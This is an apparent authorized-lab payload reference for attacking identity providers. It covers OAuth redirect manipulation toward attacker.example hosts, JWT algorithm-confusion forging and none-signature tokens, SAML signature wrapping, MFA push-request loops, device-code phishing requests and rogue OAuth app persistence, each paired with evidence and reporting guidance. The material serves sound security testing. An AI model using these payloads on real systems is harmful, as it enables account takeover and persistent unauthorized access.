# Payloads — identity-provider-attack

> Authorized-laboratory payloads for testing identity-provider trust boundaries. Every request must stay inside the written scope and use controlled tenants, users, and callbacks.

## OAuth 2.0 and OIDC Flow Attacks

### State Parameter Reuse

```http
GET /authorize?response_type=code&client_id=APP_ID&redirect_uri=https%3A%2F%2Fapp.contoso.example%2Fcallback&state=REUSED_STATE HTTP/1.1
Host: idp.contoso.example
```

**Evidence to capture**

- The original callback containing `state=REUSED_STATE`.
- The replayed callback using the same value.
- Whether the application binds the authorization code to the original browser session.

### PKCE Downgrade

```python
from urllib.parse import urlencode

params = {
    "response_type": "code",
    "client_id": "LAB_CLIENT_ID",
    "redirect_uri": "https://app.contoso.example/callback",
    "scope": "openid profile",
    # Deliberately omit code_challenge and code_challenge_method.
}
print("https://idp.contoso.example/authorize?" + urlencode(params))
```

**Interpretation**

- Public clients should require S256; plain or missing PKCE is a finding only if the provider supports the downgrade.
- Record the client type and provider metadata before reporting severity.

### redirect_uri Validation Matrix

```text
Baseline:         https://app.contoso.example/callback
Path traversal:   https://app.contoso.example/callback/../../attacker
Query chained:    https://app.contoso.example/callback?next=https://attacker.example
Suffix host:      https://app.contoso.example.attacker.example/callback
Case confusion:   https://APP.CONTOSO.EXAMPLE/callback
Unicode lookalike: https://app.contoso.example/callback
```

Run the matrix one value at a time. A value is exploitable only when the provider both accepts it and returns an authorization code to attacker-controlled storage.

### OAuth Mix-Up

```text
1. Start a flow at Client C with IdP-1.
2. Obtain a valid code/token for IdP-1 and victim V.
3. Start a second flow at Client C with IdP-2.
4. Substitute the IdP-1 callback values into the IdP-2 flow.
5. Record whether C mints a session and which issuer/subject it trusts.
```

Confirm the exact missing validation: `iss`, `aud`, `azp`, token endpoint binding, or provider-specific state association.

### OIDC Claim Substitution Matrix

```text
iss: exact tenant/issuer required; no wildcard or suffix match
aud: client_id must be an exact element in aud
azp: required when aud contains multiple audiences
sub: must bind to the authenticated subject, not the email hint
nonce: must be single-use and browser-session bound
at_hash: required when the ID token references an access token
```

Test each field independently. Combine fields only after documenting the single-field failure so the report does not obscure the root cause.

## JWT Attacks

### Algorithm Confusion

```python
import jwt

public_key = b"-----BEGIN PUBLIC KEY-----\n<LAB_JWKS_PUBLIC_KEY>\n-----END PUBLIC KEY-----\n"
forged = jwt.encode(
    {"sub": "lab-victim", "role": "admin"},
    public_key,
    algorithm="HS256",
    headers={"kid": "LAB_KEY_ID"},
)
print(forged)
```

This is valid only when the verifier accepts both symmetric and asymmetric algorithms with the same key material. Record the accepted algorithm allowlist.

### kid Header Injection

```json
{"alg": "HS256", "kid": "../../dev/null"}
```

Test whether `kid` is treated as a trusted file path, JWK selector, or arbitrary key-store identifier. Do not assume path traversal; prove the resolved key source.

### null signature

```text
eyJhbGciOiJub25lIn0.eyJzdWIiOiJsYWItdmljdGltIn0.
```

The payload is intentionally inert. It is a verifier regression probe, not an exploitation primitive.

### JWKS Rotation and key_confusion

```bash
# Save the current and rotated JWKS documents for an offline diff.
curl -fsS "https://idp.target.example/.well-known/jwks.json" -o jwks-before.json
curl -fsS "https://idp.target.example/.well-known/jwks.json" -o jwks-after.json
diff -u jwks-before.json jwks-after.json || true
```

Check whether the application pins `kid`, accepts unknown keys without a chain of trust, or mixes keys across issuers.

## SAML Attacks

### XML Signature Wrapping

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <Assertion ID="lab-legitimate"><!-- signed assertion --></Assertion>
  <Assertion ID="lab-attacker">
    <Subject>lab-attacker@contoso.example</Subject>
  </Assertion>
</samlp:Response>
```

Apply standard XSW shapes one at a time. A result is reportable only when the service provider authenticates the unsigned or repositioned assertion.

### Metadata Trust Poisoning

```text
1. Change the lab metadata entityID, ACS URL, or signing certificate.
2. Force a metadata refresh.
3. Start SSO and verify which endpoint and key the SP consumes.
4. Return an assertion signed by the injected key.
```

Report the trust anchor: metadata URL, signature, certificate pinning, or administrative import process.

## MFA and Session Attacks

### MFA Request Generation

```python
import requests

for sequence in range(10):
    response = requests.post(
        "https://login.contoso.example/lab/mfa/challenge",
        json={"user": "lab-victim", "test_sequence": sequence},
        timeout=5,
    )
    print(sequence, response.status_code)
```

Keep the request count inside the engagement's approved rate. Number matching and FIDO2 should not expose an approval oracle.

### Legacy Protocol Bypass

```bash
# Confirm whether IMAP TLS is exposed before using the approved mail client.
openssl s_client -connect mail.target.example:993 -quiet
```

Do not attempt online password guessing. The test validates protocol policy with controlled credentials.

### Session Cookie Token Theft

```text
Pre-MFA URL:   /authorize?prompt=none&max_age=0
Post-MFA URL:  /authorize?prompt=login&max_age=0
Application:   detect session-age claim and replay window
```

Differentiate an IdP session from an application session. MFA bypass requires proof that the post-MFA material itself grants access, not merely that the IdP kept the user signed in.

## Entra ID and Workload Identity Attacks

### Device Code Phishing

```bash
# Request a lab device-code flow and inspect the verification URI.
curl -fsS -X POST "https://login.target.example/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "client_id=LAB_PUBLIC_CLIENT&scope=openid%20profile"
```

Report the user prompt, allowed scopes, token lifetime, device compliance requirement, and audit event. Never send the code to a real user.

### Workload Federation Subject Mismatch

```json
{
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:contoso/lab-app:ref:refs/heads/main",
  "audience": "api://AzureADTokenExchange",
  "claim": "repository"
}
```

Change one field at a time in the lab: repository, environment, actor, branch, workflow, or issuer. The finding is the accepted mismatch, not the ability to submit a crafted assertion.

### Service Principal Permission Chain

```text
1. Inventory the service principal's app roles and OAuth2PermissionGrants.
2. Trace each role to the least-privileged Graph or application action.
3. Demonstrate one authorized read and one denied privileged action.
4. Record the consent type and tenant-wide admin grant.
```

Report both privilege and blast radius. Avoid claiming tenant compromise unless a privileged role or cross-resource chain is demonstrated.

## Persistence and Consent Attacks

### Rogue OAuth Application

```json
{
  "displayName": "LAB Security Scanner",
  "requiredResourceAccess": [
    {
      "resourceAppId": "LAB_GRAPH_RESOURCE",
      "resourceAccess": [
        {"id": "LAB_MAIL_READ_ROLE", "type": "Scope"}
      ]
    }
  ]
}
```

Test whether admin consent is required, whether publisher verification is enforced, and whether the consent record is visible to the end user.

### Refresh Token Family Replay

```text
1. Use refresh token R0 for access token A0.
2. Reuse R0 after rotation.
3. Use derived refresh token R1 from the expected client.
4. Attempt R1 from a different client_id and redirect_uri.
```

Document reuse detection, family revocation, sender-constrained tokens, and the audit event emitted for each branch.

## Commanded Reconnaissance and Exploitation

### Identity Surface Fingerprint

```bash
whatweb "https://login.target.example" | tee identity-fingerprint.txt
curl -fsS "https://login.target.example/.well-known/openid-configuration" \
  -o openid-configuration.json
curl -fsS "https://login.target.example/.well-known/jwks.json" -o jwks.json
```

### OAuth Authorization Probe

```bash
curl -sv "https://idp.target.example/authorize?response_type=code&client_id=LAB_CLIENT&redirect_uri=https%3A%2F%2Fapp.contoso.example%2Fcallback&state=lab-state" \
  -o authorization-response.html
```

### JWT Algorithm Confusion Probe

```bash
python3 jwt_tool.py tokens.jwt -X k -pk public.pem
```

### Rogue Application Persistence

```bash
curl -fsS -X POST "https://graph.target.example/v1.0/applications" \
  -H "Authorization: Bearer $LAB_ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d @rogue-app-manifest.json
```

## Known Identity Provider CVEs

All identifiers below were verified against the NVD API on 2026-09-07 before inclusion.

| CVE | Product | CVSS | Summary from the NVD record |
|-----|---------|------|-------------------------------|
| CVE-2019-14909 | redhat/keycloak | 9.3 | Keycloak 7.x LDAP bind type `none` permits anonymous LDAP binding. |
| CVE-2019-14910 | redhat/keycloak | 9.8 | Keycloak 7.x LDAP StartTLS handling permits man-in-the-middle attacks. |
| CVE-2017-7474 | keycloak/keycloak-nodejs-auth-utils | 9.8 | The Keycloak Node.js adapter 2.5–3.0 does not correctly reject invalid tokens. |
| CVE-2019-10199 | redhat/keycloak | 8.8 | The Keycloak account console through 6.0.1 performs inadequate header checks. |
| CVE-2019-10201 | redhat/keycloak | 8.1 | The Keycloak SAML broker through 6.0.1 can accept messages with missing signatures. |
| CVE-2019-14832 | redhat/keycloak | 7.5 | The Keycloak REST API before 8.0.0 permits cross-realm user access under a vulnerable configuration. |

## Reporting Requirements

For every successful path, capture:

1. The request and normalized response, with secrets redacted.
2. The IdP and application audit events.
3. The exact failed trust check (`iss`, `aud`, `azp`, signature reference, nonce, device, or consent).
4. The shortest safe reproduction and remediation.
5. The blast radius: affected users, applications, tenants, and downstream resources.
